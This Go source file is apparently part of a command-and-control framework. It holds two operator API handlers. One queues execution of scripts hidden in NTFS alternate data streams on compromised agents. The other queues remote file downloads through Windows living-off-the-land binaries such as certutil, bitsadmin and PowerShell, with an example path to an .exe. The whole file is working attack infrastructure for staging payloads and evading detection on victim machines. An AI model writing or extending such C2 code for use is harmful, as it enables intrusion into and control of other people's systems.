package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/mjopsec/taburtuaiC2/internal/services"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ADSExec queues an ADS script execution command on the agent.
// POST /api/v1/agent/:id/ads/exec
// Body: { "ads_path": "C:\\file.txt:payload.js", "wait": false }
func (h *Handlers) ADSExec(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		ADSPath string `json:"ads_path" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}
	if err := validateFilePath(req.ADSPath); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid ADS path: %v", err))
		return
	}

	cmd := &types.Command{
		ID:            uuid.New().String(),
		AgentID:       agentID,
		OperationType: "ads_exec",
		SourcePath:    req.ADSPath,
		CreatedAt:     time.Now(),
		Status:        "pending",
		Timeout:       60,
	}

	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "ADS_EXEC", req.ADSPath, true)

	h.APIResponse(c, true, "ADS exec queued", map[string]interface{}{
		"command_id": cmd.ID,
		"ads_path":   req.ADSPath,
	}, "")
}

// LOLBinFetch queues a LOLBin-based file download on the agent.
// POST /api/v1/agent/:id/fetch
// Body: { "url": "http://...", "destination": "C:\\tmp\\file.exe", "method": "certutil" }
func (h *Handlers) LOLBinFetch(c *gin.Context) {
	agentID := c.Param("id")

	agent, exists := h.server.Monitor.GetAgent(agentID)
	if !exists {
		c.Status(http.StatusNotFound)
		h.APIResponse(c, false, "", nil, "Agent not found")
		return
	}
	if agent.Status == services.StatusOffline {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "Agent is offline")
		return
	}
	if h.enforceAgentWrite(c, agentID) {
		return
	}

	var req struct {
		URL         string `json:"url"         binding:"required"`
		Destination string `json:"destination"  binding:"required"`
		Method      string `json:"method"`
		Timeout     int    `json:"timeout"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid request: %v", err))
		return
	}

	validMethods := map[string]bool{"certutil": true, "bitsadmin": true, "curl": true, "powershell": true, "": true}
	if !validMethods[req.Method] {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, "method must be one of: certutil, bitsadmin, curl, powershell")
		return
	}
	if req.Method == "" {
		req.Method = "certutil"
	}
	if err := validateFilePath(req.Destination); err != nil {
		c.Status(http.StatusBadRequest)
		h.APIResponse(c, false, "", nil, fmt.Sprintf("Invalid destination: %v", err))
		return
	}
	if req.Timeout <= 0 || req.Timeout > 3600 {
		req.Timeout = 120
	}

	cmd := &types.Command{
		ID:              uuid.New().String(),
		AgentID:         agentID,
		OperationType:   "lolbin_fetch",
		FetchURL:        req.URL,
		FetchMethod:     req.Method,
		DestinationPath: req.Destination,
		CreatedAt:       time.Now(),
		Status:          "pending",
		Timeout:         req.Timeout,
	}

	h.server.CommandQueue.Add(agentID, cmd)
	h.server.Logger.LogCommandExecution(agentID, "LOLBIN_FETCH",
		fmt.Sprintf("%s → %s (via %s)", req.URL, req.Destination, req.Method), true)

	h.APIResponse(c, true, "LOLBin fetch queued", map[string]interface{}{
		"command_id":  cmd.ID,
		"url":         req.URL,
		"destination": req.Destination,
		"method":      req.Method,
	}, "")
}
